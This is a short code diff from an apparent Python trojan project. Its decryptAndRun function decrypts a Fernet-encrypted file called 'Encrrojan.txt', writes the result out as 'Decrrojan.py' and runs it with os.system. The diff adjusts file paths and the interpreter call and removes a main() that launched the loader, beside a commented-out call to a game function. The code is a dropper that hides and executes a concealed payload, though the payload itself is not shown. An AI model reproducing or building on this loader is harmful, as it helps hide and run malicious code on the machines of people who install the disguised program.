@@ -23,27 +23,18 @@ def decryptAndRun():
 
     f =Fernet (key)
 
-    with open ("trojan/Encrrojan.txt" , 'rb') as encrypted_file:
+    with open ("Encrrojan.txt" , 'rb') as encrypted_file:
         encrypted = encrypted_file.read()
 
     decrypted = f.decrypt(encrypted)
 
-    with open ("trojan/Decrrojan.py" , 'wb') as decrypted_file:
+    with open ("Decrrojan.py" , 'wb') as decrypted_file:
         decrypted_file.write(decrypted)
 
 
 
     #run
-    os.system("python trojan/Decrrojan.py")
+    os.system("python3 Decrrojan.py")
 
 
 
-
-def main():
-    
-    decryptAndRun()
-    #jeu()  
-
-
-if __name__ == "__main__":
-    main()
